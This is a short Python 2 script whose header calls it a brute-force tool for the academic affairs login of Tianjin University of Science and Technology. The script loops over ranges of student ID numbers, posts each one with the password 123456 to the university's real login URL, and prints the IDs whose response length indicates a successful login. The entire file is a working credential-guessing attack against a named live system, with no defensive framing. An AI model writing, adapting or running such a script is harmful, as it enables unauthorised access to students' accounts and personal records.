# coding=utf-8
# anka9080
# 天津科技大学教务处多线程爆破脚本

import urllib
import urllib2
import cookielib

# get blank cookie
cookieUrl = 'http://pic.tust.edu.cn/pic/login.do'
cj = cookielib.CookieJar()
handler = urllib2.HTTPCookieProcessor(cj)
opener = urllib2.build_opener(handler)
# urllib2.install_opener(opener)
# resp = urllib2.urlopen(cookieUrl)
resp = opener.open(cookieUrl)

id = 12011101

i = j = k = l = 0
count = 0
print 'Mode:the pwd is same with id'
#pwd = raw_input()
while i < 14:
    while j < 6:
        while k < 2:
            while l < 30: 
                pwd = 123456;        
                values = {'Login.Token1':id,'Login.Token2':pwd}
                data = urllib.urlencode(values)
                url = 'http://pic.tust.edu.cn/pic/login.do'
                request = urllib2.Request(url,data)
                #response = urllib2.urlopen(request)
                response = opener.open(url,data)
                html =  response.read()
                
                if(len(html) > 10000):
                    print id
                    count = count + 1
                id = id + 1
                l= l + 1
            id = id + 100 - 30
            k = k + 1
            l = 0
        id = id + 1000 - 200
        j = j + 1
        k = l = 0
    id = id + 10000 - 6000
    i = i + 1
    j = k = l = 0
print 'Query Over! '
print 'Count: ' + str(count) 